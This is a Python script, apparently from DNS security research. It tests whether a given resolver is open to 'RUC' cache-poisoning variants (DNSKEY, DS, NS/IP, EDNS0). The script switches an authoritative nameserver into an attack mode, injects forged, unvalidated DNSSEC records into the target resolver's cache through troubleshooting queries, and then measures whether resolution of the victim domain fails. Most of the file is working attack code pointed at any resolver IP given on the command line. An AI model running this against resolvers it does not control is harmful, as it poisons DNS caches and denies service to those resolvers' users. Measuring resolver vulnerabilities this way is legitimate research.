import os
import json
import time
import requests
import argparse
from pathlib import Path

from utils import *

TEST_LOG_DIR='ruc_test_result'

class RUCVulnTest:
    def __init__(self,resolver_ip,ruc_variant,with_sig):
        self.resolver_ip=resolver_ip
        self.ruc_variant=ruc_variant
        self.with_sig=with_sig

        with open(Path(os.getcwd()) / 'config.json') as f:
            config_dict=json.load(f)

        # victim domain's nameserver (for API control)
        self.victim_nameserver=config_dict['victim_nameserver']
        if self.resolver_ip=='127.0.0.1':   
            self.victim_nameserver['ip']='47.251.171.85'   # use our remote authoritative nameserver instead of the local container to test Microsoft DNS

        # attack settings (query interval and rounds)
        self.inject_interval=config_dict['inject']['interval']
        self.inject_round=config_dict['inject']['round']
        self.verify_interval=config_dict['verify']['interval']
        self.verify_round=config_dict['verify']['round']
        self.result_folder=config_dict['result_folder']

        # victim domain
        self.victim_apex=config_dict['victim_apex']
        if self.resolver_ip=='127.0.0.1':   
            self.victim_apex='dnssec-ruc-ms.xyz'   # use a dedicated victim zone under our control to test Microsoft DNS
        self.victim_domain=config_dict['victim_subdomains'][self.ruc_variant]+'.'+self.victim_apex
        if self.ruc_variant=='ruc_ds':
            self.victim_domain_apex=config_dict['victim_subdomains']['ruc_ds_apex']+'.'+self.victim_apex
        if self.ruc_variant=='ruc_nsip':
            self.victim_domain_nsdom=config_dict['victim_subdomains']['ruc_nsip_nsdom']+'.'+self.victim_apex

        # bits in DNSSEC troubleshooting queries
        self.cd=config_dict['troubleshooting_query']['cd']
        self.ad=config_dict['troubleshooting_query']['ad']
        self.do=config_dict['troubleshooting_query']['do']
        self.opt=config_dict['troubleshooting_query']['opt']

    def config_authns(self,mode):
        attack_api_ip=self.victim_nameserver['ip']
        attack_api_port=self.victim_nameserver['port']
        attack_api_url=self.victim_nameserver['url']
        attack_api_username=self.victim_nameserver['username']
        attack_api_password=self.victim_nameserver['password']
        response=requests.post(
            f"http://{attack_api_ip}:{attack_api_port}/{attack_api_url}",
            json={'attack':self.ruc_variant,'mode':mode,'with_sig':self.with_sig},
            auth=(attack_api_username,attack_api_password),
        )
        return json.loads(response.text)

    def inject_cache(self):
        for i in range(self.inject_round):
            # Inject unvalidated data of the corresponding RUC variant to the resolver cache
            if self.ruc_variant=='ruc_dnskey':
                print(send_dns_request(self.resolver_ip,self.victim_domain,'DNSKEY',self.cd,self.ad,self.opt,self.do))
            
            elif self.ruc_variant=='ruc_ds':
                print(send_dns_request(self.resolver_ip,self.victim_domain,'DS',self.cd,self.ad,self.opt,self.do))
            
            elif self.ruc_variant=='ruc_nsip':
                print(send_dns_request(self.resolver_ip,'ns.'+self.victim_domain_nsdom,'A',self.cd,self.ad,self.opt,self.do))
                print(send_dns_request(self.resolver_ip,self.victim_domain,'NS',self.cd,self.ad,self.opt,self.do))
                
            elif self.ruc_variant=='ruc_edns0':
                nonce_prefix=generate_random_string()
                print(send_dns_request(self.resolver_ip,nonce_prefix+'.'+self.victim_domain,'A',self.cd,self.ad,self.opt,self.do))
            
            time.sleep(self.inject_interval)
            print("Cache injected, round %d / %d..." % (i+1,self.inject_round))

    def verify_dos(self):
        resolver_ip=self.resolver_ip
        with_sig=self.with_sig
        log_file_path = Path(self.result_folder) / resolver_ip / self.ruc_variant / str(with_sig) / f"dns_output-{self.inject_interval}-{self.inject_round}-{self.verify_interval}-{self.verify_round}.txt"
        log_file=(str(log_file_path))
        if os.path.exists(log_file):
            os.remove(log_file)
        result_file_path = Path(self.result_folder) / resolver_ip / self.ruc_variant / str(with_sig)
        if not os.path.exists(result_file_path):
            os.makedirs(result_file_path)
        start=time.time()
        idx=0
        while idx<self.verify_round:
            end=time.time()
            if end-start>=self.verify_interval:

                # Here we simulate ordinary client querying the victim domain with DNSSEC validation required.
                # In an ordinary `dig` query, CD=0 and AD=1. It contains EDNS0 OPT record, in which DO=0.
                dns_output=str(send_dns_request(self.resolver_ip,self.victim_domain,'A',0,1,1,0))
                log_dns_output(dns_output,log_file)

                idx+=1
                start=end

                if 'SERVFAIL' in dns_output:
                    response_code='SERVFAIL'
                elif 'timeout' in dns_output:
                    response_code='TIMEOUT'
                else:
                    response_code='NOERROR'
                print("Verify round %d / %d finish. Response: %s" % (idx,self.verify_round,response_code))

        return self.query_failure_rate(log_file)

    def query_failure_rate(self,log_file):
        f=open(log_file)
        lines=f.readlines()
        f.close()
        
        is_dosed=False
        total_count=0
        answer_count=0
        for line in lines:
            if self.victim_domain in line:
                if has_ip_answer(line):
                    answer_count+=1
                if line.startswith(';'+self.victim_domain):
                    total_count+=1
            elif ('[*] dns request no output' in line) or ('[*] dns request timeout' in line):
                total_count+=1
    
        servfail_count=total_count-answer_count
        if answer_count==0:
            is_dosed=True
        return is_dosed,servfail_count/total_count*100

def test_ruc_resolver(resolver_ip,ruc_variant,with_sig):
    ruc_vuln_test=RUCVulnTest(resolver_ip,ruc_variant,with_sig)
    
    # 1. Run the attacker's manipulation script on the victim domain's authoritative nameserver, to simulate an on-path / IP spoofing attacker
    inject_result=ruc_vuln_test.config_authns('inject')
    print(inject_result)
    if inject_result['ref']!=0:
        print('Fatal error: fail to run the attack script!')
        exit(1)
    
    # 2. At the client side, inject forged, unvalidated data into the resolver cache via DNSSEC troubleshooting queries
    print('Injecting forged records into the tested resolver',resolver_ip)
    ruc_vuln_test.inject_cache()
    
    # 3. Stop the attacker's manipulation, resume the original, benign authoritative nameserver
    print('Inject finish. Resume the authoritative nameserver and verify the DoS...')
    resume_result=ruc_vuln_test.config_authns('resume')
    if resume_result['ref']!=0:
        print('Fatal error: fail to rusume the authoritative nameserver!')
        exit(1)
    # wait 5 seconds for the nameserver to resume (the nameserver process will be restarted)
    time.sleep(5)
    
    # 4. Test whether the resolver encounters DoS wehn resolving the victim domain. If RUC vulnerability exists, is_dosed is True
    is_dosed,query_failure_rate=ruc_vuln_test.verify_dos()
    
    # 5. Log test results
    resolver=get_resolver(resolver_ip)
    if ruc_variant in {'ruc_dnskey','ruc_ds'}:
        if with_sig==0:
            with_sig_str='w/o SIG'
        else:
            with_sig_str='w/ SIG'
    else:
        with_sig_str='-'
    if is_dosed:
        if with_sig_str!='-':
            print(f'\n[+] The tested resolver {resolver} is vulnerable to {ruc_variant} ({with_sig_str}).',end=' ')
        else:
            print(f'\n[+] The tested resolver {resolver} is vulnerable to {ruc_variant}.',end=' ')
        print('Query failure rate: %.2f%%\n' % query_failure_rate)
    else:
        if with_sig_str!='-':
            print(f'\n[-] The tested resolver {resolver} is not vulnerable to {ruc_variant} ({with_sig_str}).\n')
        else:
            print(f'\n[-] The tested resolver {resolver} is not vulnerable to {ruc_variant}.\n')
    
    if not os.path.exists(TEST_LOG_DIR):
        os.makedirs(TEST_LOG_DIR)
    if resolver_ip!='127.0.0.1':
        test_log_file=Path(TEST_LOG_DIR) / 'log_ruc_test.csv'
    else:
        test_log_file=Path(TEST_LOG_DIR) / 'log_ruc_test-microsoft.csv'
    fw=open(test_log_file,'a')
    fw.write(f'{resolver}|{resolver_ip}|{ruc_variant}|{with_sig_str}|{is_dosed}|{query_failure_rate}\n')
    fw.close()

if __name__=='__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('--resolver_ip',help='IP address of the tested DNS resolver.',required=True)
    parser.add_argument('--ruc_variant',help='RUC attack variant (ruc_dnskey, ruc_ds, ruc_nsip, ruc_edns0).',default='ruc_dnskey')
    parser.add_argument('--with_sig',help='Ways to manipulate the RRSIG, i.e., either removed (w/o SIG) or manipulated (w/ SIG), applicable to ruc_dnskey and ruc_ds only. 0 for w/o SIG, 1 for w/ SIG',default=0)
    args=parser.parse_args()
    
    test_ruc_resolver(args.resolver_ip,args.ruc_variant,int(args.with_sig))
